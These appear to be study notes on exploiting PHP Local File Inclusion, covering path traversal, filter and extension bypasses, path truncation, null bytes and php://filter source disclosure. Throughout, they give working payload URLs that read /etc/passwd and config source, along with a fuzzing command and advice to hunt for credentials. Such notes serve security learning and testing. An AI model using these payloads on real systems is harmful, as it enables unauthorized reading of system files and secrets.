## 1- Local File Inclusion (LFI)
LFI occurs when a web application includes files using user input without proper validation, allowing attackers to read or sometimes execute local files on the server.
#### Basic LFI
If a web app dynamically includes files (like `?language=en.php`), attackers can manipulate this parameter to include system files such as `/etc/passwd` or `C:\Windows\boot.ini`.  
Example:
```bash
http://example.com/index.php?language=/etc/passwd
```
if vulnerable, it will display the content of the file (e.g., list of system users).
### Path Traversal
Sometimes developers append a directory to the parameter:
```php
include("./languages/" . $_GET['language']);
```
In such cases, direct paths like `/etc/passwd` fail because the app looks inside `./languages/`.  
Attackers can use relative paths (`../`) to move up directories:

```bash
http://example.com/index.php?language=../../../../etc/passwd
```
This technique works even if the parameter is directly used in `include()`.
>The number of `../` depends on how deep the current directory is (e.g., `/var/www/html/` → `../../../` to reach root).
### Filename Prefix
If input is prefixed, like:
```php
include("lang_" . $_GET['language']);
```
The payload `../../../etc/passwd` becomes invalid (`lang_../../../etc/passwd`).  
Attackers can bypass this by adding `/`:
```bash
http://example.com/index.php?language=/../../../etc/passwd
```
This may work if the prefix is treated as a directory.
### Appended Extensions
If developers append extensions:
```php
include($_GET['language'] . ".php");
```
Using `/etc/passwd` becomes `/etc/passwd.php`, which fails.  
Bypasses include using **PHP wrappers** or **null-byte injections** or **Path Truncation** 
### Second-Order Attacks
In some apps, user-controlled values (e.g., usernames) are later used in file inclusion.  
If an attacker sets their username to `../../../etc/passwd`, and another feature includes `avatar/$username.png`, this could trigger an LFI.  
Such vulnerabilities occur indirectly through stored values and are called **Second-Order Attacks**.



---


## 2- Basic Bypasses

When a web application applies protections against LFI, normal payloads may fail. However, many filters can still be bypassed if they are not implemented securely.

#### Non-Recursive Path Traversal Filters

A simple filter may remove `../` to block directory traversal:
```php
$language = str_replace('../', '', $_GET['language']);
```

This removes `../` once, not recursively. So payloads like `....//` or `..././` still resolve to `../` and bypass the filter.  
Example:
```bash
http://example.com/index.php?language=....//....//etc/passwd
```

This successfully includes `/etc/passwd`.  
Other working variations include:
- `....////`
- `....\/`
- `..././`

```bash
# all variations
....//
..././
....////
....\/
..././
```
#### Encoding
If filters block `.` or `/`, URL encoding can bypass them.  
Encode `../` as `%2e%2e%2f`:
```bash
http://example.com/index.php?language=%2e%2e%2f%2e%2e%2fetc%2fpasswd
```
The web server decodes this back to `../../etc/passwd`, bypassing the filter.  
> Encode all characters (including dots). Double-encoding can sometimes bypass stricter filters.

#### Approved Paths
Some apps restrict inclusions to approved directories:
```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
}
```
To bypass, prepend the approved path (`/languages`), then traverse back:
***the approved path:***
- ==we can examine the requests sent by the existing forms, and see what path they use for the normal web functionality.==
- ==fuzz web directories under the same path, and try different ones until we get a match==
after we find the approved we combine it with path traverse like this example
```bash
http://example.com/index.php?language=./languages/../../../../etc/passwd
```
**Combining with URL encoding or recursive traversal increases success chances.**
#### Appended Extensions
If the app appends `.php`:
```php
include($_GET['language'] . ".php");
```
The payload `/etc/passwd` becomes `/etc/passwd.php`, which fails.  
Bypasses are limited on modern PHP versions, but older techniques may still work.
##### Path Truncation
Older **PHP versions (before 5.3/5.4)** truncated strings longer than **4096 characters**. This allowed bypassing appended extensions like `.php`.

so  using : 
- 1-  **PHP versions (before 5.3/5.4)** truncated strings longer than **4096 characters**
- 2- PHP a remove trailing  **/.**  in path names, so if we call (**/etc/passwd/.**) =>  PHP would call (**/etc/passwd**)
- **also**  PHP, and Linux  ignore multiple slashes `///`  in the path (e.g. `////etc/passwd` is the same as `/etc/passwd`)

==**If we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path**==

>**important to note that we would also need to ==start the path with a non-existing directory==**

 payload:
```bash
?language=non_existing_directory/../../../etc/passwd/./././././ (repeated ~2048 times)
```
To generate automatically:
```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```
This truncates `.php` while keeping `/etc/passwd` intact.
##### Null Bytes
In PHP < 5.5, adding a null byte (`%00`) terminated the string early, ignoring what followed.  
Payload:
```bash
http://example.com/index.php?language=/etc/passwd%00
```
Even if `.php` is appended, it gets cut off after `%00`, effectively including `/etc/passwd`.


#### if we can't bypass it 
if  we can't bypass the appending the web language  extension to our LFI path (ex. 'PATH+==.php==')
**so we will use the ==PHP filter==  (type of php wrappers)**
 
---
## 3- PHP Filters (read php files)
[PHP Filters](https://www.php.net/manual/en/filters.php) are a type of PHP wrapper can  let PHP access different input/output streams (files, memory, STDIN/STDOUT). In web testing, these can turn a Local File Inclusion (LFI) into a more powerful exploit — e.g., reading PHP source code or helping achieve remote code execution. The text explains basic **PHP filters for reading source code** 

`example.com/?language=en`
```php
include($_GET['language'] . ".php");
```

 - ** if  we can't bypass the LFI Approved Path** , ==so w can only read the PHP files==
 - **example we try to read php file `xample.com/index.php?language=configure.php` so it will not display on the web page instead it will executed  **  ==solution ==> PHP filter==

#### Input Filters

PHP provides wrappers that allow handling different types of input streams. The `php://` scheme can be used for this purpose, and specifically, the `php://filter/` wrapper allows filtering data before it is read.
`php://filter/read=convert.base64-encode/resource=config`

The key parameters are:
- **resource** – specifies the file or stream to read
- **read** – specifies the filter to apply

Among the available filters (string, conversion, compression, encryption), the most useful for LFI exploitation is `convert.base64-encode`, which encodes file contents into Base64 instead of executing them.
#### Fuzzing for PHP Files
Start by fuzzing for PHP files using tools like `ffuf` or `gobuster`:
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ -e '.php'
  # config                  [Status: 302, Size: 0, Words: 1, Lines: 1]
```
> Scan for all status codes (`200`, `301`, `302`, `403`) because LFI allows access even to restricted or redirected files. 

==Once files are found, read their source code and search for references to other PHP files.==
#### Standard PHP Inclusion
Including a `.php` file normally causes it to execute, not display its source. For example, including `config.php` may render nothing if it contains configuration code only.

To read the PHP source instead of executing it, use the Base64 filter to encode the file’s contents before inclusion.
#### Source Code Disclosure
Use the Base64 filter to read PHP source code through LFI:
```bash
# example.com/?language=en
# php filter payload
# php://filter/read=convert.base64-encode/resource=config

http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```
This returns a Base64-encoded version of the file, which can be decoded locally:
```bash
echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
```
Decoded example:
```php
if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}
```
Once decoded, analyze the code for credentials, configuration details, or references to additional PHP files for further inclusion.